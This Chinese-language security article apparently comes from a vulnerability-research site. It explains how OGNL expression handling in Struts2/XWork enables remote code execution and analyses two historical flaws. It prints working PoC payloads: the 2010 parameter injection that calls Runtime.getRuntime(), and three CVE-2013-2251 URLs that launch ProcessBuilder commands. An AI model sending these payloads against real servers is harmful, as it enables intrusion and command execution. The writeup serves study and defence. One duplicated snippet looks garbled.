# OGNL设计及使用不当造成的远程代码执行漏洞

我们可以把OGNL作为一个底层产品,它在功能实现中的设计缺陷,是如何能够被利用并远程执行恶意代码的,而不是完全在struts2这个产品的功能设计层面去讨论漏洞原由!

#### 什么是OGNL?

OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言（Expression Language，简称为EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。OGNL三要素：(以下部分摘抄互联网某处,我觉得说得好)

```
Ognl.setValue("department.name", user2, "dev");

System.out.println(user2.getDepartment().getName());

Ognl.setValue(Ognl.parseexpression_r("department.name"), context, user2, "otherDev");

System.out.println(user2.getDepartment().getName());

Ognl.setValue("department.name", user2, "dev");

System.out.println(user2.getDepartment().getName());

Ognl.setValue(Ognl.parseexpression_r("department.name"), context, user2, "otherDev");

System.out.println(user2.getDepartment().getName());

```

#### 1. 表达式（Expression）

表达式是整个OGNL的核心，所有的OGNL操作都是针对表达式的解析后进行的。表达式会规定此次OGNL操作到底要干什么。我们可以看到，在上面的测试中，name、department.name等都是表达式，表示取name或者department中的name的值。OGNL支持很多类型的表达式，之后我们会看到更多。

#### 2. 根对象（Root Object）

根对象可以理解为OGNL的操作对象。在表达式规定了“干什么”以后，你还需要指定到底“对谁干”。在上面的测试代码中，user就是根对象。这就意味着，我们需要对user这个对象去取name这个属性的值（对user这个对象去设置其中的department中的name属性值）。

#### 3. 上下文环境（Context）

有了表达式和根对象，我们实际上已经可以使用OGNL的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在OGNL的内部，所有的操作都会在一个特定的环境中运行，这个环境就是OGNL的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定OGNL的操作“在哪里干”。 OGN L的上下文环境是一个Map结构，称之为OgnlContext。上面我们提到的根对象（Root Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root Object）的存取操作的表达式是不需要增加#符号进行区分的。

Struts 2中的OGNL Context实现者为ActionContext，它结构示意图如下:

 ![2013071900034178341.png](http://drops.javaweb.org/uploads/images/ebf85cd2dc18415d5027040986adf6695e9a8418.jpg)

当Struts2接受一个请求时，会迅速创建ActionContext，ValueStack，action 。然后把action存放进ValueStack，所以action的实例变量可以被OGNL访问

那struts2引入OGNL到底用来干什么?

我们知道在MVC中,其实所有的工作就是在各层间做数据流转.

在View层的数据是单一的,只有不带数据类型的字符串.在没有框架的时代我们使用的是手动写代码或者像struts1一样利用反射,填充表单数据并转换到Controller层的对象中，反射转换成java数据类型的commons组件伪代码,如：

```
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.beanutils.ConvertUtils;
import org.apache.commons.beanutils.PropertyUtils;

//自动装载表单及验证
public class LoadForm {
    //表单装载
    public static Object parseRequest(HttpServletRequest request,HttpServletResponse response,Object bean) throws ServletException, IOException{
           //取得所有参数列表
           Enumeration<?> enums = request.getParameterNames();
           //遍历所有参数列表
           while(enums.hasMoreElements()){
            Object obj = enums.nextElement();
            try {
             //取得这个参数在Bean中的数据类开
             Class<?> cls = PropertyUtils.getPropertyType(bean, obj.toString());
             //把相应的数据转换成对应的数据类型
             Object beanValue = ConvertUtils.convert(request.getParameter(obj.toString()), cls);
             //填充Bean值
             PropertyUtils.setProperty(bean, obj.toString(), beanValue);
            } catch (Exception e) {
                //不显示异常 e.printStackTrace();
            }
           }
           return bean;
        }   
    }

```

从Controller层到View层,还是手动写代码然后到页面上取,如伪代码:

```
request.setAttribute("xxx", "xxx");

```

而Struts2采纳了XWork的一套完美方案(Xwork提供了很多核心功能：前端拦截机（interceptor），运行时表单属性验证，类型转换，强大的表达式语言（OGNL – the Object Graph Navigation Language），IoC（Inversion of Control反转控制）容器等). 并在此基础上构建一套所谓完美的机制,OGNL方案和OGNLValueStack机制.

View层到Controller层自动转储;然后是Controller层到View层,我们可以使用简易的表达式取对象数据显示到页面,如: ${对象.属性},节省不少代码时间且使用方便.而它的存储结构就是一棵对象，这里我们可以把对象树当成一个java对象寄存器，可以方便添加、访问对象等。 但是OGNL的这些功能或机制是危险的.

我们列举一下表达式功能操作清单：

```
1. 基本对象树的访问
对象树的访问就是通过使用点号将对象的引用串联起来进行。
例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx

2. 对容器变量的访问
对容器变量的访问，通过#符号加上表达式进行。
例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx

3. 使用操作符号
OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。

4. 容器、数组、对象
OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]
同时，OGNL支持对Map的按键值查找：
例如：#session['mySessionPropKey']
不仅如此，OGNL还支持容器的构造的表达式：
例如：{"green", "red", "blue"}构造一个List，#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}构造一个Map
你也可以通过任意类对象的构造函数进行对象新建：
例如：new Java.net.URL("xxxxxx/")

5. 对静态方法或变量的访问
要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：
例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources

6. 方法调用
直接通过类似Java的方法调用方式进行，你甚至可以传递参数：
例如：user.getName()，group.users.size()，group.containsUser(#requestUser)

7. 投影和选择
OGNL支持类似数据库中的投影（projection） 和选择（selection）。
投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个集合中每个元素的公共属性。
例如：group.userList.{username}将获得某个group中的所有user的name的列表。
选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：
? 选择满足条件的所有元素
^ 选择满足条件的第一个元素
$ 选择满足条件的最后一个元素
例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。

```

结合之前的漏洞POC,只举两例漏洞说明本质问题所在(其他类似,如:安全限制绕过,非必要使用OGNL或奇葩地利用OGNL实现设计功能等).那么只要struts2的某些功能使用了OGNL功能,且外部参数传入OGNL流程的,理论上都是能够执行恶意代码的.

参照之前的PoC从“表达式功能操作清单”中选取“危险项清单”,一些危险的功能操作,问题就出现在它们身上，提供了比较有危害PoC的构造条件:

```
1. 基本对象树的访问
对象树的访问就是通过使用点号将对象的引用串联起来进行。
例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx

2. 对容器变量的访问
对容器变量的访问，通过#符号加上表达式进行。
例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx

3. 容器、数组、对象
OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]
同时，OGNL支持对Map的按键值查找：
例如：#session['mySessionPropKey']
不仅如此，OGNL还支持容器的构造的表达式：
例如：{"green", "red", "blue"}构造一个List，#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}构造一个Map
你也可以通过任意类对象的构造函数进行对象新建：
例如：new Java.net.URL("xxxxxx/")

4. 对静态方法或变量的访问
要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：
例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources

5. 方法调用
直接通过类似Java的方法调用方式进行，你甚至可以传递参数：
例如：user.getName()，group.users.size()，group.containsUser(#requestUser)

```

以及上下文环境和这个struts2设计，当Struts2接受一个请求时，会迅速创建ActionContext，ValueStack，action 。然后把action存放进ValueStack，所以action的实例变量可以被OGNL访问。

第一个,是2010年7月14号(亮点1:乌云好象就是这天出生的吧?),"Struts2/XWork < 2.2.0远程执行任意代码漏洞",POC:

```
?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&amp;(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&amp;(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1

```

也就是这个经典的POC,大家开始第一次认识struts2漏洞(之前也有，只是那时很少有人去关注,或许很容易就能找到一个0day(而且是永远的0day,回溯一下框架历史,我不能再提示了!)。 myibatis框架也有引入OGNL的,亲!

由于ONGL的调用可以通过http传参来执行，为了防止攻击者以此来调用任意方法，Xwork设置了两个参数来进行防护：

```
OgnlContext的属性 'xwork.MethodAccessor.denyMethodExecution'（默认为真）
SecurityMemberAccess私有字段'allowStaticMethodAccess'（默认为假）

```

(这里我现在还没想明白,既然都有这步限制了?为什么后面的那些还会出现,难道官方只会看着公布的PoC打补丁?)

这里大家都知道,是使用#限制OgnlContext 'xwork.MethodAccessor.denyMethodExecution'和'allowStaticMethodAccess'上下文访问以及静态方法调用的值设置.而漏洞作者使用十六进制编码绕过了限制,从而调用@java.lang.Runtime@getRuntime()这个静态方法执行命令.

```
java.lang.Runtime.getRuntime().exit(1) （终止当前正在运行的 Java 虚拟机）

```

在某些struts2漏洞中已经开始改变这个观念,因为我们很难再绕过上面的安全限制了.去调用上下文的属性及静态方法执行恶意java代码.

但是"危险清单"中还有一个可以利用,OGNL表达式中居然可以去new一个java对象(见危险项清单 3.),对于构造PoC足够用了，而不需要上面那些条件.(之前也有类似的相关漏洞,我发现官方并不喜欢做代码审计的)

Apache Struts CVE-2013-2251 Multiple Remote Command Execution Vulnerabilities

这里漏洞原理大致是这样,作者一共提供了三个PoC:

```
http://www.example.com/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()} (这个和后面两个是有点区别的，多测试目标时你会发现！)

http://www.example.com/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}

http://www.example.com/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()} 

action:
redirect:
redirectAction:

```

这三关键字是struts2设计出来做短地址导航的,但它奇葩地方在于,如：redirectAction:${恶意代码}后面可以跟OGNL表达式执行,找这种相关的漏洞很好找（如果还有）,查看struts2源代码${},%{}等(struts2只认定这些特征的代码进入OGNL表达式执行流程)，struts2执行ognl表达式的实现功能的地方.

而java.lang.ProcessBuilder是另外一个可以执行命令的java基础类,还有后面大家手中的PoC(new文件操作及输入输出流相关危险类等),此时我们发现只要new对象然后调用其方法就可以了.不再需要上面的一些静态方法等.

这里只能将OGNL和struts2各打50大板了!